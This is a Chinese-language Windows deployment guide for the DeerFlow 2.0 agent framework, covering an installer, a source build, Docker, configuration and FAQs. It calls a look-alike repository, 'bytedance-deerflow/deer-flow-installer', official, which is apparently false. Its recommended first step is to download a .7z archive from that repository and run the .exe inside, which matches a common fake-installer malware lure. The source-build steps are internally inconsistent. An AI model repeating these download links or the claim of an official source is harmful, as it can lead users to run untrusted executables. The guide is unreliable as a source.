# DeerFlow 2.0 Windows 部署方案

## 📋 概述

DeerFlow 2.0 是 ByteDance 开源的 Super Agent Harness，支持深度研究、代码生成、内容创作等复杂任务。基于 LangGraph 和 LangChain 构建，提供完整的沙箱执行环境、子代理系统和长期记忆功能。

**官方仓库**: https://github.com/bytedance-deerflow/deer-flow-installer

## 🖥️ 系统要求

| 项目 | 要求 |
|------|------|
| 操作系统 | Windows 10/11 (64-bit) |
| 内存 | 推荐 16GB+ |
| 磁盘 | 至少 10GB 可用空间 |
| 网络 | 需要访问 OpenAI API 等外部服务 |

## 🚀 快速部署（推荐方式）

### 步骤 1：下载安装包

访问官方 Releases 页面下载最新安装包：

```bash
# 直接下载链接
https://github.com/bytedance-deerflow/deer-flow-installer/releases/download/deer-flow-installer/deer-flow_x64.7z
```

### 步骤 2：解压并安装

1. 解压 `deer-flow_x64.7z` 文件
2. 运行 `deer-flow_x64.exe` 安装程序
3. 按照安装向导完成安装

### 步骤 3：启动应用

- 开始菜单中找到 **DeerFlow** 并启动
- 或在命令行运行 `deer-flow` 命令

## 🛠️ 从源码部署（高级）

### 环境准备

1. **安装 Python 3.11+**

```powershell
# 检查Python版本
python --version
```

2. **安装 Docker Desktop**

- 下载并安装 [Docker Desktop for Windows](https://www.docker.com/products/docker-desktop)
- 确保 WSL2 后端已启用
- 启动 Docker Desktop

3. **克隆项目**

```bash
git clone https://github.com/bytedance-deerflow/deer-flow-installer.git
cd deer-flow-installer
```

### 安装依赖

```bash
# 创建虚拟环境（推荐）
python -m venv venv
.\venv\Scripts\activate

# 安装依赖
pip install -r requirements.txt
```

### 配置环境变量

创建 `.env` 文件：

```bash
# 必需：LLM API配置
OPENAI_API_KEY=your_openai_api_key
OPENAI_BASE_URL=https://api.openai.com/v1  # 或其他兼容API

# 可选：模型配置
DEFAULT_MODEL=gpt-4o

# 可选：Telegram配置
TELEGRAM_BOT_TOKEN=your_telegram_bot_token

# 可选：Slack配置
SLACK_BOT_TOKEN=your_slack_bot_token
SLACK_APP_TOKEN=your_slack_app_token

# 可选：飞书配置
FEISHU_APP_ID=your_feishu_app_id
FEISHU_APP_SECRET=your_feishu_app_secret
```

### 启动服务

```bash
# 方式1：本地模式（无需Docker）
python -m deer_flow.main

# 方式2：Docker模式
docker-compose up -d

# 服务地址
# - LangGraph Server: http://localhost:2024
# - Gateway API: http://localhost:8001
```

## 📝 配置文件说明

主配置文件 `config.yaml`：

```yaml
# 服务配置
server:
  host: 0.0.0.0
  port: 2024

gateway:
  host: 0.0.0.0
  port: 8001

# 沙箱模式：local | docker | kubernetes
sandbox:
  mode: docker

# 模型配置
models:
  default:
    provider: openai
    model: gpt-4o
    temperature: 0.7

# 消息渠道配置
channels:
  telegram:
    enabled: false
    bot_token: ""
    
  slack:
    enabled: false
    bot_token: ""
    app_token: ""
    
  feishu:
    enabled: false
    app_id: ""
    app_secret: ""
```

## 🔧 技能系统

DeerFlow 使用 Skills 定义代理能力：

```
/mnt/skills/public/          # 内置技能
├── research/               # 研究技能
├── report-generation/      # 报告生成
├── slide-creation/         # 幻灯片创建
├── web-page/               # 网页生成
└── image-generation/      # 图片生成

/mnt/skills/custom/         # 自定义技能（用户添加）
```

### 添加自定义技能

1. 在 `skills/custom/` 目录下创建新技能文件夹
2. 添加 `SKILL.md` 定义技能工作流
3. 重启服务使技能生效

## 📦 Docker 部署（可选）

### 构建镜像

```bash
docker build -t deerflow:latest .
```

### 运行容器

```bash
docker run -d \
  --name deerflow \
  -p 2024:2024 \
  -p 8001:8001 \
  -v $(pwd)/data:/mnt/user-data \
  -e OPENAI_API_KEY=your_key \
  deerflow:latest
```

### 使用 Docker Compose

```yaml
version: '3.8'
services:
  deerflow:
    image: deerflow:latest
    ports:
      - "2024:2024"
      - "8001:8001"
    environment:
      - OPENAI_API_KEY=${OPENAI_API_KEY}
    volumes:
      - ./data:/mnt/user-data
    restart: unless-stopped
```

## 🐛 常见问题

### Q1: 安装后无法启动？

1. 检查是否安装了 Visual C++ Redistributable
2. 确保 Docker Desktop 已启动（如果是 Docker 模式）
3. 检查 `.env` 文件中的 API Key 是否正确

### Q2: Docker 模式启动失败？

```powershell
# 检查Docker状态
docker ps

# 查看容器日志
docker logs deerflow

# 重启Docker服务
Restart-Service docker
```

### Q3: 如何更新到最新版本？

```bash
# 通过安装包更新
# 1. 下载最新安装包
# 2. 卸载旧版本
# 3. 安装新版本

# 或通过源码更新
git pull origin main
pip install -r requirements.txt
```

### Q4: 支持哪些模型？

DeerFlow 支持任何 OpenAI 兼容的 API，包括：
- OpenAI GPT-4o / GPT-4
- Anthropic Claude
- 阿里通义千问
- 字节跳动云雀
- 本地部署的 LLM（如 LM Studio）

## 📚 相关资源

- 官方文档：https://github.com/bytedance-deerflow/deer-flow-installer
- Skills 仓库：https://github.com/bytedance-deerflow/deer-flow-installer/tree/main/skills
- Releases：https://github.com/bytedance-deerflow/deer-flow-installer/releases

## 📄 附录：完整环境变量列表

```bash
# LLM 配置
OPENAI_API_KEY=your_key
OPENAI_BASE_URL=https://api.openai.com/v1
DEFAULT_MODEL=gpt-4o

# 消息渠道
TELEGRAM_BOT_TOKEN=
SLACK_BOT_TOKEN=
SLACK_APP_TOKEN=
FEISHU_APP_ID=
FEISHU_APP_SECRET=

# MCP 服务器（可选）
MCP_SERVER_URL=
MCP_SERVER_AUTH_TOKEN=

# 高级配置
RECURSION_LIMIT=100
LOG_LEVEL=INFO
```

---

*文档最后更新：2026-03-24*
